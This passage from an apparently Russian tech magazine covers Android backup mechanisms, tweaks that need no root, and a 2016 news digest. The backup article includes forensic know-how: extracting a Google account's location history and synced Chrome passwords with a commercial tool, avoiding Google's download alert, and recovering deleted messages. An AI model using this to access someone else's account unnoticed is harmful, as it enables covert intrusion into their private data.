  новить данные после сброса устройства, обновления прошивки или апгрейда.
  Во-вторых, восстановить бэкап от телефона Sony на планшет от ASUS (и нао-
  борот) тебе не удастся: восстанавливать нужно тем же софтом на модель того
 же производителя.





                                                  Бэкап, созданный прошивкой от ASUS

  Впрочем, если ты планируешь пользоваться устройством долгое время, поче-
 му бы и не создать резервную копию? Да, это не всегда удобно, и да, это никак
  не автоматизируется, но ведь возможность-то есть. А если с твоим телефоном
  что-то случится и если ты решишь заменить его на устройство от того же про-
  изводителя, то тебе, может быть, даже удастся восстановить на него данные.
  Уверенности, разумеется, никакой: производитель гарантирует успешное вос-
  становление только на устройство той же модели, с которой были скопирова-
 ны данные.

 РЕЗЕРВНОЕ КОПИРОВАНИЕ: ВЕРСИЯ GOOGLE
  Устройства под управлением Android — это пестрый зоопарк платформ, ар-
  хитектур, производителей, аппаратных и программных конфигураций. Сложно
  сделать так, чтобы резервные копии, созданные с телефона одного произво-
  дителя, не дестабилизировали работу смартфона на совершенно другой ар-
  хитектуре. Вероятно, это и служит основной причиной того, с какой скоростью
  Google разрабатывает механизм резервного копирования.
    Если не считать существовавших с первой версии Android механизмов син-
  хронизации контактов, календаря и других приложений Google с облаком, то
  полноценный механизм резервного копирования приложений и настроек поя-
  вился только в Android 4.3. Он был доступен лишь в режиме разработки и толь-
  ко через Android Debug Bridge. Иными словами, для «обычных» пользователей
  его не существовало.
   В какой-то момент Google начала синхронизировать некоторые данные
  с облаком. При восстановлении устройства предлагалось восстановить и дан-
 ные (ярлыки, приложения и настройки) с одного из предыдущих устройств. Эта
  функциональность, строго говоря, не является частью Android, а реализована
  в проприетарных сервисах Google.
   С Android 6.0 облачное резервное копирование настроек официально
  стало частью операционной системы. Теперь разработчику приложения до-
  статочно включить в manifest приложения флажок, разрешающий резервное
  копирование данных, и система будет автоматически копировать их в обла-
  ко. Разумеется, облако это от Google, а данные привязаны к учетной запи-
  си Google Account, так что пользователи AOSP-сборок без сервисов Google
  остаются в стороне. Что ж, давай рассмотрим эти механизмы подробнее. На-
 рушив хронологию, начнем с наиболее современного и интересного механиз-
  ма, представленного в Android 6.0.

 ANDROID 6.0: МЫ СДЕЛАЛИ ЭТО!
  Начиная с Android 6.0 система автоматически сохраняет настройки системы
  и приложений в Google Drive пользователя. Решил обновить устройство? Твой
 новый смартфон автоматически подхватит настройки из облака, сам установит
  приложения, которыми ты пользовался на старом устройстве, и автоматиче-
  ски настроит их привычным для тебя образом. Почти как у Apple! И так оно все
  и работало в предварительных сборках Android M до самого релиза.
    А в официальной версии Android 6.0 разработчики резко сменили пластин-
  ку. Если в предварительных сборках автоматическое резервное копирование
  работало для всех приложений, авторы которых не заблокировали эту возмож-
  ность в явном виде (флаг opt-out в manifest), то в официальной версии систе-
 мы резервные копии создаются только для приложений, авторы которых в яв-
 ном виде затребовали сервис (opt-in через manifest) и прописали поддержку
  Android 6.0 (target API level 23).
    Как ты думаешь, много ли разработчиков воспользовались этой возможно-
  стью? В замечательной статье Android 6.0 has a great auto backup system that no
  one is using (yet) журналисты Ars Technica подробно рассмотрели, какие прило-
  жения используют, а какие не используют встроенный в Android 6.0 механизм
  резервного копирования.
    Результаты оказались... неожиданными. В первую очередь встроенным ме-
  ханизмом резервного копирования НЕ ПОЛЬЗУЮТСЯ приложения Google.
  Да-да, разработчик этой великолепной системы решил обойтись без нее.
  Восстанавливаются базовые настройки системы, будильники, «тихий режим»,
  но данные приложений Google — нет. А вот клиенты социальных сетей, почто-
 вые клиенты, игры и прочие популярные приложения не спешат добавлять под-
  держку. Разумеется, ситуация будет меняться со временем, но пока вот так.
 После сброса редакционного Nexus 6 и восстановления из облака произошло
  следующее:
  •  восстановились все приложения. При этом они были установлены из Google
      Play, то есть восстанавливались всегда последние версии;
  •  восстановилась часть настроек: языки встроенной клавиатуры, настройки
     «тихого режима», будильники;
  •  не восстановилась история звонков и СМС;
  •  не восстановились настройки Facebook;
  •  не восстановились данные большинства приложений (например, gReader
     Pro пришлось настраивать заново).
 Иными словами, система установила все ранее установленные приложения,
  но не восстановила данные подавляющего большинства из них. Впрочем, кон-
  такты и email подхватились из облака, доступ к фотографиям — тоже. А на-
  строить заново пару десятков приложений — нам не привыкать. Более под-
 робно о работе Android Backup Service можно прочитать в справке Google.

 МОЖНО ЛИ ИЗВЛЕЧЬ ДАННЫЕ ИЗ ОБЛАКА?
  Если Google может сохранить данные в облако, то мы можем их извлечь,
  не правда ли? Давай посмотрим, что можно сделать.
    Во-первых, точно так же, как и в описанном в предыдущем номере примере
  скачивания данных из iCloud, нужны логин и пароль пользователя к учетной за-
  писи Google. Это не все; если включена двухфакторная аутентификация (а ее
  активируют все чаще), потребуется и одноразовый код, который будет генери-
  роваться приложением Google Authenticator, Microsoft Authenticator, FreeOTP
  или любым из множества сторонних (работают они по единому принципу,
  и различается только криптографический код инициализации, который выда-
  ется пользователю в виде цветного QR-кода).
    Еще нам потребуется соответствующий софт (можно обойтись и без него —
 об этом ниже). В качестве софта мы использовали Elcomsoft Cloud eXplorer.
  Запускаем приложение, авторизуемся в учетной записи Google, выбираем
 данные для скачивания:





  Скачали? Наслаждаемся:





  Количество информации, которую собирает Google, честно говоря, шокиру-
  ет. Да, абстрактно мы знаем, что за нами следят. Знаем, что тщательно со-
  храняется каждая страничка, которую мы посещаем, каждая закладка в брау-
  зере (разумеется, для нашего же удобства — синхронизация!). Само собой,
  сохраняется каждый поисковый запрос, адресованный «Корпорации добра»
  (ты уже понял, что искать в интернете рецепт создания ядреной бондбы —
  не лучшая идея?):





  Доступен список устройств, установленные на них приложения и собственно
 данные приложений:





  Конечно, есть доступ к фотографиям (привет, iCloud!):





 Для нашего же удобства сохраняется подробнейшая история перемещений:





  Неплохо попутешествовал! А вот то же самое в текстовом виде:





 В общем, просто масса всего интересного. Если честно, в учетной записи
  Google можно найти гораздо больше всего, чем когда-либо осмеливались со-
  хранить решения от Apple.
    Откуда и каким образом извлекаются все эти данные? А вот это, пожалуй,
 самое интересное. «Корпорация добра» придерживается политики макси-
  мальной информационной открытости. Ты всегда можешь просмотреть или
  скачать всю информацию, которую корпорация собрала о тебе. Ты можешь
  удалить любые данные, и для этого не требуется уничтожать свою учетную за-
  пись. Наконец, ты можешь отключить сбор отдельных типов данных (например,
  настроить свой телефон таким образом, что информация о твоем местополо-
 жении не будет отсылаться в Google).
    Нас же в этом контексте интересует тот пункт, согласно которому ты впра-
  ве скачать всю информацию, собранную о тебе Google. Официальный способ
  сделать это — через сервис Google Takeout. Здесь можно выбрать, какие типы
  данных мы хотим скачать:





 Выбранные данные будут запакованы в файл и предоставлены в виде архива:





  Как видишь, ничего сложного. В чем подвох? Зачем нужен Elcomsoft Cloud
  eXplorer? Не проще ли скачать данные непосредственно из Google Takeout?
    Подвоха как такового, в общем-то, нет. И данные скачать можно. Неболь-
 шая проблема возникает с анализом полученной информации. Для хранения
  и экспорта данных Google использует массу разнообразных форматов (в ос-
 новном — открытых). К примеру, данные о своих перемещениях ты получишь
  в виде файла в формате JSON — делай с ним что хочешь, Google тебе не по-
  мощник. Не помощник он и спецслужбам: согласно официальной позиции
  компании, Google подчиняется закону и передает данные в открытом виде
  и в стандартном формате... что с ними будут делать дальше — ни малейшим
 образом не забота компании. А вот сам факт выдачи информации спецслуж-
 бам Google запишет, сохранит и опубликует.
    Еще один момент. При скачивании через сервис Google Takeout пользова-
  телю обязательно придет уведомление: такие-то данные были скачаны с та-
  кого-то IP. Если тебе это не нужно, обращайся к сторонним инструментам: их
  использование не вызывает у Google тревоги. И на закуску — самое интерес-
  ное. Google Takeout по какой-то причине не дает скачать синхронизированные
  в Chrome пароли. А Elcomsoft Cloud eXplorer извлекает их без особых проблем:





 Магия? Нет, Google предоставляет доступ и к этой информации. Все, что
  для этого нужно, — получить доступ к синхронизированным данным брау-
  зера Chrome, после чего они скачаются в виде XML-файла. Веб-интерфейс
  для просмотра синхронизированных паролей доступен здесь.


                             Продолжение статьи
MOBILE


    Начало статьи
BACKUPS
       FOR FUN
     AND PROFIT

  РАЗБИРАЕМСЯ С МЕХАНИЗМАМИ БЭКАПА
    ANDROID И ДОСТАЕМ ИЗ НИХ ДАННЫЕ





РЕЗЕРВНОЕ КОПИРОВАНИЕ ЧЕРЕЗ ADB
Начиная с Android 4.3 в системе появился штатный способ создания резерв-
ной копии через интерфейс Android Debug Bridge (ADB). Для создания резерв-
ной копии нужно использовать примерно такую команду:

adb backup -apk -shared -system -all -f C:\backup.ab

Почему «примерно»? Да в силу все того же «зоопарка» устройств. Мы проте-
стировали большое количество устройств от разных производителей, работа-
ющих под управлением разных версий Android от 4.4 до 6.0.1 включительно.
На каких-то устройствах команда сработала в таком виде, на других указание
ключей -system или -shared приводило к созданию пустого файла, а третьи от-
казывались воспринимать ключ -all. Какой-либо логики в поведении команды
adb мы уловить не смогли; точно сказать можно одно: от версии Android ее по-
ведение зависит мало. Скорее зависимость здесь от настроек, заданных кон-
кретным производителем.
   Например, на редакционном Nexus 6 под управлением Android 6.0.1 про-
шла следующая команда:

adb backup -all -f c:\nexus6.ab

А вот опция -noapk «сломала» бэкап: был создан пустой файл. А еще adb
backup может не работать, если включено шифрование раздела данных. На-
помним, что шифрование включается по умолчанию на устройствах линейки
Nexus, а также (по требованию Google) на всех устройствах, которые выходят
с предустановленным Android 6 и оснащены 64-разрядными процессорами.
  Еще один момент. Adb backup спроектирован таким образом, чтобы ре-
зервную копию, созданную на одном устройстве, можно было без проблем
восстановить на другом. И ключевое слово здесь вовсе не «восстановить»,
а «без проблем»: восстановленное устройство должно работать и не должно
глючить. Соответственно, сохраняются и восстанавливаются только те данные
и настройки, которые точно не навредят стабильной работе даже тогда, когда
данные переносятся с 32-битного смартфона с чипсетом MediaTek на 64-раз-
рядный планшет с Intel Atom.
   Восстановить данные из резервной копии будет несложно с помощью ко-
манды adb restore.
   Что же попадает в такие резервные копии? И снова ответ зависит от произ-
водителя устройства. К примеру, в смартфонах Sony контакты, журнал звонков
и СМС в резервные копии ADB не попадает, а телефоны Samsung эти данные
сохраняют. То же самое относится к настройкам устройства (которые зачастую
уникальны для конкретного производителя) и данным системных приложений.
  В резервную копию точно попадает список установленных приложений. Из-
влекаются и сохраняются APK-файлы (если во время создания копии была ука-
зана соответствующая опция). А вот данные приложений могут сохраняться,
а могут и нет: зависит это от разработчиков, которые разрешают или не раз-
решают резервное копирование в manifest-файле приложения.
  С практической точки зрения нам не удалось извлечь большой пользы
из таких резервных копий. При восстановлении через adb restore все равно
приходится авторизоваться в Gmail, Facebook и прочих клиентах почты и соци-
альных сетей. Не сохранились настройки FBReader и Nova Launcher (у которо-
го, к слову, есть собственный механизм создания резервных копий). А что со-
хранилось? С трудом припоминается, что на некоторых аппаратах удалось
восстановить журнал звонков и архив СМС.
   Встроенным в Android механизмом ре-
зервного копирования пользуются и некото-
рые сторонние приложения. Им несть чис-
ла, так что рассматривать все мы не будем.
Принцип работы всех подобных программ
схож, и различаются они только добавленны-
ми возможностями. Самая популярная про-
грамма такого типа — Helium AppSync and
Backup от известной команды разработчиков
ClockworkMod (кастомное рекавери CWM —
их разработка).

Что внутри?
Резервные   копии,  создаваемые  через
ADB, — вещь достаточно простая. На выхо-
де — архив, содержащий данные приложений
(в зависимости от настроек — и собственно
.apk). Они сохраняются в том виде, в кото-
ром их хранит само приложение. Как прави-
ло, приложения используют формат SQLite,
реже — XML, еще реже — двоичные данные
в собственном формате.                                                           Интерфейс Helium
   Для анализа SQLite придумано столько
инструментов, что для самого краткого об-
зора потребовалась бы отдельная статья. Скажу лишь, что с помощью таких
инструментов можно вытащить удаленные записи. Пример? Пожалуйста. Если
тебе повезло и производитель твоего телефона разрешил копировать журнал
звонков и СМС, то ты сможешь восстановить сообщения и звонки, которые
были удалены пользователем.

КАСТОМНЫЕ RECOVERY И БЭКАПЫ NANDROID
Рассказывая о системе резервного копирования Android, нельзя не упомянуть
такое явление, как резервные копии Nandroid. Термин образовался от слов
NAND (тип флеш-памяти) и Android, и используется чаще всего в контексте
создания копии всего пользовательского (и, зачастую, системного) разде-
ла целиком с использованием кастомного рекавери (чаще всего CWM или
TWRP). Переносимость резервных копий Nandroid ограничена. Их рекоменду-
ется восстанавливать на то же устройство, с которого они были сделаны, и же-
лательно на ту же прошивку.

Что внутри?
Резервные копии Nandroid — штука достаточно абстрактная. У каждого река-
вери этот формат свой. Более того, форматы могут отличаться в зависимости
от устройства (напомню: кастомное рекавери — это, по сути, отдельная опе-
рационная система со своими особенностями для каждой поддерживаемой
модели).
   Что же мы получаем? Чаще всего на выходе — образ файловой системы
(вкупе с оригинальной файловой системой, которая была использована на кон-
кретном устройстве). Анализ простой: монтируем образ (потребуется драйвер
соответствующей файловой системы) и бродим по файловой системе.
  В некоторых случаях нам выдают набор ZIP-архивов с данными приложе-
ний. Тут тоже все просто: заходим в архив и смотрим; формат данных такой же,
как в случае с adb backup, но сам набор данных гораздо полнее. Иногда соз-
дается один-единственный архив с набором файлов внутри. Нам попадались
как простые .zip, так и .tar.gz (расширение может не совпадать).
  Общая особенность бэкапов Nandroid в том, что ни одно протестирован-
ное нами кастомное рекавери (а мы тестировали десятки вариантов) не соз-
дает полный образ раздела с данными. Под «полным» образом мы понимаем
образ, который содержит как оригинальную файловую систему, так и незаня-
тые блоки — свободное место. Анализ свободных блоков позволил бы прове-
сти сканирование на предмет поиска удаленных файлов. К сожалению, не вы-
йдет. Если требуется именно это, тебе придется использовать другие методы.
(В скобках замечу, что образ системного раздела большинством рекавери
создается целиком, со всеми «потрохами».)

Titanium Backup

Несколько особняком стоит приложение Titanium Backup — самая популяр-
ная программа для создания резервных копий, доступная в Google Play. С ее
помощью нам удалось создать резервную копию данных всех установленных
приложений (включая .apk), после чего успешно восстановить их на новое
устройство. Обрати внимание: Titanium копирует двоичные данные из песоч-
ниц приложений, поэтому крайне не рекомендуем с его помощью перено-
сить данные системных приложений Android. При восстановлении их на другое
устройство система может работать нестабильно.


ЗАКЛЮЧЕНИЕ
Сегодня мы изучили часть механизмов резервного копирования, доступных
в устройствах под управлением Android. Фрагментация платформы не позво-
ляет рассмотреть все существующие способы и приложения, призванные об-
легчить резервное копирование и миграцию данных, но даже те, что были опи-
саны, демонстрируют довольно жесткие ограничения как по совместимости,
так и по полноте копируемых данных.
  В целом наш вывод таков. Пользуешься «стоковым» Android? Включай об-
лачную синхронизацию контактов и фотографий. Облачное резервное копиро-
вание может частично восстановить ранее установленные приложения, а если
сильно повезет, то в отдельных приложениях могут частично восстановиться
и какие-нибудь данные. Если на устройстве, с которого создавалась и на ко-
торое была восстановлена резервная копия, стоит Android 6.0 или выше, то
из облака восстановится больше данных в сравнении с более старыми верси-
ями Android.
   Встроенный механизм adb backup может помочь восстановить часть дан-
ных пользователям более старых версий Android. Сторонние приложения эф-
фективны только при наличии прав root. Использование кастомного рекавери
и создание Nandroid backup решит большую часть проблем, но доступен этот
режим мизерному числу пользователей.
  В результате система резервного копирования в Android получает от нас
оценку «лучше, чем ничего». Превзойти Android по неудобству не смог никто:
даже в старенькой Windows Phone 8 резервное копирование работает гораз-
до удачнее.
   А как обстоят дела с резервным копированием у аутсайдеров рынка, те-
лефонов под управлением мобильной версии Windows и BlackBerry 10?
Об этом — в следующем номере!
MOBILE
 КОГДА




                                                                         Денис Погребной
                                                                                           denis2371@gmail.com НЕ НУЖЕН
                РАСШИРЯЕМ
                 ФУНКЦИОНАЛЬНОСТЬ
                    ANDROID, НЕ ИМЕЯ ПРАВ
                  СУПЕРПОЛЬЗОВАТЕЛЯ ROOT





Многие продвинутые пользователи Android после приоб-
ретения нового девайса получают права root, чтобы тонко
настроить смартфон и установить приложения, добавля-
ющие полезную функциональность в ОС. На самом деле
даже без root Android — очень гибкая и настраиваемая
ОС, позволяющая изменять свой интерфейс и существен-
но расширять возможности. В этой статье мы собрали все
самые часто задаваемые вопросы, касающиеся «допили-
вания» интерфейса Android и разблокировки его скрытых
функций, и попытались ответить на них, не призывая взла-
мывать устройство.

В прошивках некоторых производителей устройств есть поддерж-
ка многооконного режима. Мне говорили, что получить такую же
функцию можно с помощью Xposed, который требует root. Есть ли
другой способ?
Да, существует масса приложений, которые умеют работать в обособленных
окнах. OGYouTube умеет не только скачивать видео в требуемом формате и ка-
честве, но и показывать видео в плавающем окошке с изменяемым размером.
Для просмотра видео из памяти устройства в плавающем окне прекрасно по-
дойдет GPlayer.
   Существуют даже приложения, содержащие в себе целый пакет приложе-
ний c плавающими окнами (от калькулятора до браузера). Floating Apps, на-
пример, насчитывает более дюжины различных программ в бесплатной и бо-
лее тридцати в платной версии.
  А еще есть такое понятие, как плавающие виджеты. C Floating выводит по-
лезную системную информацию в плавающих окнах, которые отображаются
поверх всех приложений. Кроме этого, C Floating может показывать виджеты
и ярлыки (те, которые с рабочего стола!), а также недавно запущенные прило-
жения.





     Несколько приложений Floating Apps                     Виджеты C Floating


Я слышал, в Android N появи-
лась удобная функция для бы-
строго переключения между
двумя запущенными приложе-
ниями (двойной тап по кнопке
мультитаскинга). Можно ли по-
лучить нечто подобное на более
ранних версиях?
Просто установи Last App Switcher.
Переключать   приложения   мож-
но через свайп вверх кнопки Home
на смартфоне без физических кла-
виш навигации или удержанием кноп-
ки Home на смарте с физическими
клавишами.
   Pintasking — еще один вариант
быстрого переключения между запу-
щенными  приложениями,  причем
не двумя, а несколькими. Иконки за-
пущенных  приложений  появляются
на экране в прилипших к краю кругах.
Бесплатная версия работает только
с двумя приложениями.

В прошивке Paranoid Android я         Pintasking и два последних приложения
видел функцию, которая позво-
ляет скрыть кнопки навигации
внизу экрана и использовать
вместо них круговое меню.
Можно ли получить нечто по-
добное без root?
Да.  Такая  функциональность  есть
в Pie Control. Однако, чтобы в нем
заработали клавиши навигации, не-
обходимо активировать приложение
в меню «Настройки   Спец. возмож-
ности».
   Скрыть строку состояния и клави-
ши навигации можно с помощью двух
приложений.  Immersive  Full-Screen
Mode стоит 100 рублей, но умеет ав-
томатически скрывать строку состо-
яния  в  выбранных  пользователем
приложениях. Hide System Bar или
всегда скрывает, или всегда показы-
вает строку. Единственный недоста-
ток обоих приложений — при скрытии
клавиш навигации клавиатура стано-
вится недоступна.

В кастомных прошивках в стро-                                                        Круговое меню Pie Control
ку состояния можно добавить
множество полезной информа-
ции. Можно ли сделать то же самое на стоке без root?
В строку состояния можно добавить дополнительные иконки с помощью сле-
дующих программ:
•  Internet Speed Meter — текущая скорость передачи данных;
•  TempMonitor — температура процессора (или аккумулятора);
•  Индикатор заряда батареи — заряд батареи в процентах;
•  Signal level notification — показывает реальный уровень сигнала в dBm (нуж-
но включить в настройках);
•  Weather Underground — прогноз погоды и просто отличное приложение;
• CPU Stats — текущая загруженность и частота процессора.

Для мониторинга множества систем-
ных параметров можно использовать
Cool Tool, но он отображает свое уве-
домление поверх всех окон, что мо-     Усовершенствованная строка состояния
жет мешать в повседневном исполь-
зовании.

Мне говорили, что прошивка
CyanogenMod позволяет тон-
ко настроить светодиод так,
как мне нужно. Теперь мне при-
дется ставить CM?
Вовсе нет, Light Flow позволяет за-
дать частоту мерцания светодиода
и настроить цвет для каждого прило-
жения индивидуально. А еще выбрать
режим вибрации, звуки уведомления
и даже мигания вспышкой.

В Motorola Moto X дисплей
включается автоматически, ког-
да берешь смартфон в руки или
получаешь уведомление. Суще-
ствуют ли приложения, реали-
зующие подобную функцио-
нальность?
Да.  Есть  прекрасное  приложение
acDisplay. Оно автоматически вклю-
чает  экран, когда ты поднимаешь
устройство со стола (акселерометр)
или вытаскиваешь из кармана (дат-
чик приближения). После появления              Экран настройки светодиода
уведомления дисплей автоматически
включается на пять секунд. Это вре-
мя можно увеличить, но следует пом-
нить, что слишком большой тайм-аут
может привести к повышенному рас-
ходу заряда аккумулятора.

Можно ли запускать отдельные
разделы, экраны, табы прило-
жений сразу с рабочего стола?
Да, можно. QuickShortcutMaker умеет
это делать.
  Приведем простой пример  его
использования. Допустим, ты хочешь
иметь на рабочем столе ярлык, ко-
торый бы сразу открывал пункт на-
строек «Память» (для быстрого из-
влечения флешек). Окей, открываем
QuickShortcutMaker, выбираем «На-
стройки». На экране появится огром-
ный  список  активити.  Вниматель-
но смотрим на строки вроде com.
android.settings/com.android.
settings.Settings$StorageSetti
ngsActivity. В данном случае нас
интересует строка после знака $. Это                                                           Экран уведомлений
название активити. Обычно оно ин-
туитивно понятно. Теперь нажимаем
на это активити и выбираем «Посмо-
треть» — активити запустится. Чтобы добавить его иконку на рабочий стол, вы-
бираем «Создать».
  В некоторых случаях можно найти активити, которые открывают скрытые
меню. В ряде смартфонов в списке могут встретиться приложения, которые
не отображаются в общем меню лаунчеров.





                           Настройки                           Quick Control Panel


В iOS классная панель управления. Хочу такую!
Поставь Quick Control Panel. Сразу предупредим, что интерфейс у этой проги
не выглядит так современно и красиво, как на iOS, зато возможностей здесь
хоть отбавляй. Вызывать панельку свайпом на девайсах с наэкранными клави-
шами неудобно. Проблема решается выбором этой программы как програм-
мы по умолчанию для свайпа вверх по клавише Home.

Мне неудобно возвращаться
на рабочий стол для запуска
приложений. Есть ли более бы-
стрые и удобные способы сде-
лать это?
Конечно. Например, Omni Swipe. Она
представляет собой меню с часто
используемыми и недавно запущен-
ными приложениями, инструментами
(фонарик, настройка яркости экра-
на, громкости звука и прочее), ко-
торые можно будет легко запустить
из любого экрана простым свайпом
из правой или левой нижних частей
экрана или с помощью маленькой
белой точки (задается в настройках).
Лайфхак: Бессмысленный, но краси-
во оформленный таск-киллер, кото-
рый включается по циферке в правой
части  экрана,  можно  отключить.
Для этого необходимо перейти в на-
стройки программы и выбрать «Пла-
вающее окно   Всплывающее окно
для улучшения». Экран, надоедливо
возникающий во время зарядки, тоже            Так выглядит выбор приложений
можно отключить: «Расширенные на-
стройки   Суперзарядка».

Можно ли хоть как-нибудь
идентифицировать неизвестно-
го звонящего абонента?
Да. И если повезет, можно даже имя
и фамилию узнать. В этом тебе помо-
жет Truecaller — наиболее популярный
сервис для определения имени або-
нента при входящих звонках и блоки-
ровки спама из создаваемой пользо-
вателями базы данных (эти функции
включаются в настройках). При пер-
вом включении потребует ввести имя,
фамилию и номер. Введенные данные
попадут в базу данных сервиса и бу-
дут отображаться другим пользовате-
лям, если ты им позвонишь. Truecaller
умеет определять оператора и реги-
он по номеру телефона, но надписи
и названия операторов показываются
на английском без логотипов.
   Также есть приложение «Сотовые
операторы». Оно отображает лого-
тип оператора  связи,  его  регион
с общеизвестным названием. База
данных с номерами обновляется каж-                     Truecaller (вверху) и «Со-
                                                      товые операторы» (внизу)
дый месяц. Доступна подробная ин-
формация о странах: Абхазии, Арме-
нии,     Беларуси,     Казахстане,
Таджикистане, Узбекистане, Украине,
Южной Осетии.

На смартфонах и планшетах
очень неудобно набирать текст.
Ставил различные клавиатуры
из маркета, а возможностей
в них недостаточно!
К сожалению, набирать текст на сен-
сорном экране вряд ли когда-нибудь
станет удобнее, чем на физической
клавиатуре. Но есть программы, ко-
торые смогут облегчить страдания.
•  Texpand. Предназначена для бы-
строго  ввода  часто  используемых
слов или словосочетаний. Например,
для ввода «Привет, как дела?» можно
просто набрать «пкд» и нажать на га-
лочку. Автозамену можно включить
пунктом Expands immediately отдель-
но для каждого сочетания, и тогда
текст будет заменяться автоматиче-
ски без нажатия на галочку, но кноп-
ка «Отменить» останется доступной.
Бесплатная версия позволяет задать
не более десяти сокращений.
•  Inputting Plus. Запоминает все сим-
волы, которые ты вводил в различные                 Копируем название инте-
                                                     ресующего приложениятекстовые поля в приложениях, и реа-
лизует аналог Ctrl + C, Ctrl + V, Ctrl + Z,
Ctrl + Y, Ctrl + F (только во введенном
тексте) на сенсорном экране.
•  Universal Copy. Ты замечал, что в Android очень часто невозможно просто
взять и скопировать текст? Даже из YouTube, Facebook или настроек? С этим
приложением ты забудешь о такой проблеме. Оно может копировать любой
текст почти откуда угодно. Теперь не придется переписывать текст на бумажку,
делать скриншот и часто переключаться между приложениями, чтобы зафикси-
ровать нужное слово, фразу или название.

У меня очень медленный мо-
бильный интернет, поэтому
каждый раз, когда я нажимаю
ссылку в каком-то приложении,
мне приходится долго ждать
загрузку страницы. Можно ли
сделать так, чтобы она загру-
жалась в фоне, а окно браузера
появлялось, только когда за-
грузка завершена?
Да,  Brave  Browser  делает именно
это. Например, ты читаешь новости,
жмешь на интересующую тебя ссыл-
ку, ее загрузка начинается в фоне,
а на дисплее отображается маленький
кружок с прогрессом загрузки. Пока
страница загружается, ты продолжа-
ешь читать новости, а по окончании
процесса нажимаешь на кружок, и пе-
ред тобой появляется окно браузера
с уже загруженной страницей.
   Flynx  также  загружает  страни-
цы в фоне с выводом прогресса
на экран. Плюс умеет отображать
страницы  в  специальном  режиме
для чтения (только сама статья с кар-
тинками). При желании можно изме-
                                                                   Brave Browser
нить цвет фона и размер шрифта.
Если этот браузер выбран по умолча-
нию для открытия ссылок, то с помо-
щью двойного тапа ты отправляешь
ссылку в список статей для отложенного чтения, так что статья будет доступна
даже офлайн.

А какие интересные программы еще существуют?
•  LinkSwipe. Позволяет одним нажатием открыть ссылку в одном приложении,
а тапом и свайпом — в другом. В бесплатной версии можно задать только один
тап и тап + свайп вправо.
•  ACR. Запись телефонных разговоров. По умолчанию автоматически пишет
все разговоры.
•  AZ Screen Recorder. Запись видео с экрана устройства. Работает только
на Android 5.0+ (требует SDK 21+).

Заключение
Android — очень простая и удобная операционная система. Вместе с тем она
обладает огромным потенциалом расширения возможностей твоего девайса.
Однако имей в виду, что каждый описанный в статье твик так или иначе будет
тратить ресурсы процессора и батареи, поэтому все должно быть в меру.
MOBILE





                                                                                 Евгений Зобнин
                                                                                                                 androidstreet.netДАЙДЖЕСТ
НОВОСТЕЙ
ЗА МЕСЯЦ





Сегодня в выпуске: Google I/O 2016, обновляемые в фоне
смартфоны, проект модульного смартфона, который ока-
зался не модульным, Android внутри Chrome OS, самый
дорогой смартфон и смартфон-браслет, а также обнов-
ленный Linux-дистрибутив для пентестинга Android, уни-
версальные патчи, которые подходят к любому смарт-
фону, и гайд по взлому загрузчика с целью его залочить.
Приятного чтения.





РЕЛИЗЫ
Безусловно, главным событием мая стала конференция Google I/O 2016, где,
кроме новинок мобильных технологий, компания представила еще много чего
любопытного. Однако для нас интересны в первую очередь релиз Android N
Developer Preview 3, VR-платформа Daydream, новый голосовой ассистент
Google Assistent, его хардварный эквивалент Google Home и новая версия
Android Wear.
   Начнем по порядку. Новая версия Android N продолжает расширять функ-
циональность операционки. Теперь она включает в себя систему Google
Assistent, которую можно назвать логическим продолжением Google Now,
а точнее его эволюцией из обезьяны в человека. Assistent не просто отвеча-
ет на вопросы, а ведет с человеком вполне осмысленный диалог, запоминая
предыдущие вопросы и составляя «психологический портрет». Тот же прин-
цип, кстати, использован в недавно анонсированном ассистенте Viv от созда-
телей Siri, базой в котором выступает искусственный интеллект.
   Google Assistent будет задействован и в домашнем аксессуаре Google
Home, прямом конкуренте колонки Amazon Echo. Смысл Google Home в том,
что в доме юзера всегда будет находиться ассистент, готовый выполнить все
его команды, включая любые вопросы, запросы к Google и управление други-
ми подключенными устройствами, такими, например, как домашняя акустика.





                                                                       Google Home

Вторым новшеством Developer Preview стала система Instant Apps, которая по-
зволяет запускать нативные приложения Android на манер веб-приложений.
Для запуска достаточно разместить на рабочем столе ярлык со специальной
ссылкой на Google Play, при запуске приложение будет загружено динамиче-
ски (в буквальном смысле по частям), а после остановки — удалено из систе-
мы. Похожая (но более топорная) концепция уже используется в смартфоне
Nextbit Robin. Instant Apps будут работать и в более ранних версиях Android
(начиная с 4.1).
  Еще одно новшество — платформа виртуальной реальности Daydream.
Она стала логическим завершением давно известной технологии, используе-
мой в Google Cardboard, в котором «шлемом виртуальной реальности» служит
картонная коробка с двумя линзами и смартфоном внутри. В отличие от кода
поддержки Cardboard, который был простым API, позволяющим создавать
VR-приложения поверх Android, Daydream глубоко интегрирована в систему
и предоставляет приложениям такие функции, как эксклюзивный доступ к гра-
фическому процессору и «умное» слежение за положением головы. Первым
девайсом, использующим данную платформу, стал ZTE Axon 7, поставляемый
в комплекте с шлемом виртуальной реальности (в который вставляется смарт-
фон, естественно).
   Ну и наиболее замечательное новшество Android N — это технология
Seamless update, которая позволяет обновлять смартфон в фоне, а затем
быстро переключаться на новую версию. Идея технологии взята из Chrome
OS и базируется на простом подходе: вместо одного системного разде-
ла в смартфоне делается два — один из них основной, а второй использует-
ся для установки обновления. После того как обновление будет прописано
во второй системный раздел, он станет основным. Поскольку в большинстве
смартфонов фиксированная таблица разделов, технология будет доступна
только на устройствах, изначально поставляемых с Android N.
  В новом Android Wear 2.0 можно отметить разве что систему обособлен-
ных приложений, способных работать без подключения к смартфону (забавно,
но та же функция появилась в Apple Watch OS 2.0), а также распознавание ру-
кописного ввода.
   Список устройств, которые предположительно получат Android N, опублико-
ван здесь, а финальная версия операционки будет доступна 25 сентября. По-
пробовать систему можно уже сейчас, скачав бета-версию с официального сай-
та. Сборки доступны для устройств Nexus 6, Nexus 5X, Nexus 6P, Nexus 9, Pixel C
и Android One. Юзеры остальных смартфонов могут установить Xposed-модуль
Android N-ify, частично превращающий Android 5.0 в Android N.

СОБЫТИЯ
Помнишь модульный смартфон Ara, который Motorola анонсировала еще
в конце 2013 года? Да, да, тот самый диковинный смартфон, в котором компо-
ненты можно менять и апгрейдить даже без необходимости разбирать смарт-
фон. Журналисты издания Wired выяснили, что разработка смартфона не толь-
ко продолжается, но и почти завершена. Продажи версии для разработчиков
начнутся уже в августе-октябре текущего года, а выпуск версии для простых
смертных запланирован на 2017 год.
   Проблема только в том, что смартфон больше не модульный. Да, из инно-
вационной платформы для сборки «своих собственных» смартфонов Project
Ara превратился в обычный смартфон, к которому можно прикреплять допол-
нительную периферию. Чипсет, оперативная и постоянная память, экран, ра-
